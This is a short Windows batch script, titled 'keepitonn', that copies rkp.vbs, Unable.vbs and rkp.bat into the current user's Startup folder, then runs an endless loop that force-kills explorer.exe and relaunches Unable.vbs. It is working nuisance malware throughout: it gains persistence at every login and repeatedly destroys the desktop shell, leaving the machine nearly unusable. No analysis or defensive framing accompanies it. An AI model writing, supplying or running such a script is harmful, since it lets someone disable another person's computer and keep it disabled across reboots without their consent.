@echo off
title keepitonn
color 02

copy rkp.vbs "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy Unable.vbs "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy rkp.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"


:a
taskkill /f /im explorer.exe
start Unable.vbs
goto a
